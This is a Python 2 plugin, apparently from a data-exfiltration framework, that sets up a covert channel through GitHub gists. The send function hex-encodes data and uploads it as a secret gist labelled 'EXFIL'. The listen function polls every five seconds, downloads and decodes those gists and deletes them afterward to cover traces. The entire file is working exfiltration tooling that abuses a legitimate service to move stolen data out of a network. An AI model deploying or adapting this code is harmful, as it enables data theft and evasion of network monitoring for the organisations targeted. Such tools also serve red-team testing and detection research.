from github import *
import github
import time
import requests

app_exfiltrate = None
g = None

def send(data):
    app_exfiltrate.log_message('info', "[github] Sending {} bytes with Github".format(len(data)))
    g.get_user().create_gist(False, {'foobar.txt': github.InputFileContent(data.encode('hex'))}, 'EXFIL')

def listen():
    app_exfiltrate.log_message('info', "[github] Checking for Gists")
    while True:
        gists = g.get_user().get_gists()
        tmp_gists = []
        for gist in gists:
            tmp_gists.append(gist)
        for gist in tmp_gists[::-1]:
            if gist.description == 'EXFIL':
                url = gist.files['foobar.txt'].raw_data['raw_url']
                req = requests.get(url)
                content = req.content
                try:
                    content = content.decode('hex')
                    app_exfiltrate.log_message('info', "[github] Receiving {} bytes within Gist".format(len(content)))
                    app_exfiltrate.retrieve_data(content)
                except Exception, err:
                    # print(err)
                    pass
                finally:
                    gist.delete()
        time.sleep(5)

class Plugin:

    def __init__(self, app, conf):
        global app_exfiltrate, g
        g = Github(conf['username'], conf['password'])
        app.register_plugin('github_gist', {'send': send, 'listen': listen})
        app_exfiltrate = app
